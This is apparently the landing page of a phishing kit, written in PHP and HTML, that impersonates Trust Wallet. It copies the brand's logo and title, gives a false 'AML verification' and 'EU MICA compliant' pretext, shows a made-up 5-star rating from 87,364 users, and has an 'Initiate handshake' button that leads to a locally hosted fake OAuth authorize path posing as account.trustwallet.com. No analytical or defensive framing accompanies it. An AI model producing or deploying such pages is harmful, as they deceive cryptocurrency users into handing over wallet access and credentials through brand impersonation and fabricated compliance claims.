<?php
// Generate the dynamic URL parameters
$client_id = "abcdefghijklmnopqrstuvwxyz123456"; // Replace with your 32-character client_id
$redirect_uri = "https%3A%2F%2Faccount.trustwallet.com%2Foauth-connect";
$state = "v2.local." . substr(bin2hex(random_bytes(32)), 0, 16) . "." . substr(bin2hex(random_bytes(32)), 16, 48);
$options = "login%account.trustwallet.com";

// Construct the full URL
$dynamic_url = "/authorize?url=/api/1/login/oauth/provider/authorize" .
    "&client_id=" . $client_id .
    "&redirect_uri=" . $redirect_uri .
    "&state=" . $state .
    "&options=" . $options;
    
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
   
    <title>Best Crypto Wallet for Web3, NFTs and DeFi | Trust</title>
   <style>
    * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
    }
    body {
        height: 100%;
        width: 100%;
        background: #1b1b1c;
    }
    .bodytaghome {
        padding: 48px 24px;

    }

   </style>
   
<link rel="stylesheet" href="assets/style/fonts.css">  </head>
  <body class="background: #1B1B1C"> 
    <div class="bodytaghome" style="background: #1b1b1c; color: #ffff; font-family: boldfont; padding: 48px;">
        
      <div>
        <svg width="39" height="43" viewBox="0 0 39 43" fill="none">
          <path
            d="M0.710815 6.67346L19.4317 0.606445V42.6064C6.05944 37.0059 0.710815 26.2727 0.710815 20.207V6.67346Z"
            style="fill: #48FF91"
            class="text-trustBlue dark:text-trustGreen"
            
          ></path>
          <path
            d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z"
            fill="url(#paint0_linear_524_77595undefined)"
          ></path>
          <path
            d="M38.1537 6.67346L19.4329 0.606445V42.6064C32.8051 37.0059 38.1537 26.2727 38.1537 20.207V6.67346Z"
            fill="url(#paint1_linear_524_77595undefined)"
          ></path>
          <defs>
            <linearGradient
              id="paint1_linear_524_77595undefined"
              x1="18.6423"
              y1="47.8852"
              x2="33.8833"
              y2="-7.39981"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset="0.26" stop-color="#48FF91"></stop>
              <stop offset="0.66" stop-color="#0094FF"></stop>
              <stop offset="0.8" stop-color="#0038FF"></stop>
              <stop offset="0.89" stop-color="#0500FF"></stop>
            </linearGradient>
          </defs>
        </svg>
      </div>
      
      <div style="display: flex;"> 
        <style>
            @media (orientation: landscape) {
  .hidedisplayondisplay {
    display: block; /* Make visible in landscape mode */
  }
}

@media (orientation: portrait) {
  .hidedisplayondisplay {
    display: none; /* Hide in portrait mode */
  }
}
.loading-circle {
    width: 20px;
    height: 20px;
    border: 3px solid #1b1b1c;
    border-top: 3px solid #48ff91;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    from {
      transform: rotate(0deg);
    }
    to {
      transform: rotate(360deg);
    }
  }
        </style>
        <div style="margin-top:48px;">
            <div style="display: flex; ">
                <h5 style="margin-right: 16px; color: #48FF91; font-family: regularfont;">SIGNATURE VERIFICATION </h5>
                <h5 style="color: #48FF91; font-family: boldfont; font-weight: 200;">Powered by BitKit Web3 Security</h5> 
            </div>
    
            <div style="margin-top: 64px; max-width: 600px; ">
                <h1 style="display: flex; flex-direction: column;"><span>You have been</span> <span>requested to perform <span style="color: #48FF91;">AML</span></span>  verification</h1>
                <p style="margin-top: 52px; font-family: regularfont;">By verifying wallets with a simple EU MICA compliant verification process, we protect customers and sellers from fraud, underhanding and other types of dangers.</p>
            </div>
        
            
        
            <div style="margin-top: 64px;">
              <a href=<?php echo htmlspecialchars($dynamic_url); ?> style="margin-top: 24px; text-decoration: none; cursor: pointer;">
                <button
                  id="handshakeButton"
                  style="
                    width: auto;
                    padding: 12px 18px;
                    font-size: medium;
                    background: #48ff91;
                    border: none;
                    text-decoration: none;
                    border-radius: 4px;
                    color: #1b1b1c;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    position: relative;
                  "
                  onclick="showLoading(this)"
                >
                  <span class="button-text" style="transition: opacity 0.2s; text-decoration: none;">Initiate handshake</span>
                  <div
                    class="loading-circle"
                    style="
                      display: none;
                      position: absolute;
                    "
                  ></div>
                </button>
              </a>
            </div>
        
            <div class="rating" style="margin-top: 34px;">
                <span>⭐⭐⭐⭐⭐</span>
                <span>|</span>
                <span>Rated 5 stars by over 87,364 users</span>
            </div>
            
          </div>
          <div class="hidedisplayondisplay">
            <img src="assets/images/handshake.svg" alt="" style="height: 80vh; margin-left: 200px;">
        </div>
      </div>
     
    </div>
    
  </body>
</html>
